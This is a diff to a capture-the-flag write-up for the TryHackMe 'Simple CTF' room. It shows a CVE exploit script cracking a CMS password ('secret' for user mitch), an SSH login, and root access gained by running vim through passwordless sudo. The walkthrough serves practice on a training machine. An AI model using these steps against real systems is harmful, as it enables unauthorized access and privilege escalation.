@@ -1,8 +1,8 @@
 ---
 title: 'TryHackMe: Simple CTF'
 author: Kertonli
-categories: [TryHackMe, Rustscan, Nmap, Feroxbuster, Cve]
-tags: [Fácil]
+categories: [TryHackMe]
+tags: [Fácil, Rustscan, Nmap, Feroxbuster, Cve, Ssh, Privilege Scalation]
 image:
   path: assets/images/tryhackme/simplectf/room.png
 ---
@@ -172,10 +172,57 @@ python2 cve.py -u http://10.10.32.37/simple --crack -w /usr/share/wordlists/rock
 
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
-[+] Email found: admin@a8
-[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
-[*] Now try to crack password
-zsh: killed     python2 cve.py --url http://10.10.32.37/simple --crack -w 
-                                                                            
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+                                                                    
 
 ```
+
+# SSH
+
+```
+ssh -p 2222 mitch@10.10.32.37
+The authenticity of host '[10.10.32.37]:2222 ([10.10.32.37]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.32.37]:2222' (ED25519) to the list of known hosts.
+mitch@10.10.32.37's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt
+G00d j0b, keep up!
+
+```
+
+# Privilege Scalation
+
+```
+
+sudo -l -l
+User mitch may run the following commands on Machine:
+
+Sudoers entry:
+    RunAsUsers: root
+    Options: !authenticate
+    Commands:
+        /usr/bin/vim
+
+Posso executar vim como sudo.
+
+sudo /usr/bin/vim /root/root.txt
+
+```
+
+![alt text](assets/images/tryhackme/simplectf/image.png)
